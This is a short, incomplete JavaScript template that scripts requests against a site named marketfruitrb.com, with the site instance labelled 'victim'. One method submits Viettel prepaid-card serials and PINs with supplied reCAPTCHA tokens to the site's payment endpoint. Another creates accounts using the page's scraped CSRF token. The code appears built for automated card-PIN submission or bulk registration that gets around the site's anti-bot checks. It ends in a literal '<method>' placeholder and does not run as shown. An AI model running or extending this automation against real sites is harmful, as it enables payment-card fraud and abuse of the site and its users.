async function() {
    class marketfruitrb {
        async transaction(serial, pin, recaptchaToken) {
            const formData = new URLSearchParams();
            formData.append('type', 'viettel');
            formData.append('token', recaptchaToken);
            formData.append('amount', '500000');
            formData.append('serial', serial);
            formData.append('code', pin);

            const response = await fetch('https://marketfruitrb.com/transaction/index', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    credentials: 'include'
                },
                body: formData.toString()
            })

            return await response.text()
        }

        async register(email, name, password, recaptchaToken) {
            const token = document.querySelector('input[name="_token"]').value

            const formData = new URLSearchParams();
            formData.append('_token', token);
            formData.append('token', recaptchaToken);
            formData.append('email', email);
            formData.append('name', name);
            formData.append('password', password);
            formData.append('password1', password);

            const response = await fetch('https://marketfruitrb.com/reg.html', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    credentials: 'include'
                },
                body: formData.toString()
            })

            return await response.text()
        }
    }

    const victim = new marketfruitrb()
    
    <method>
}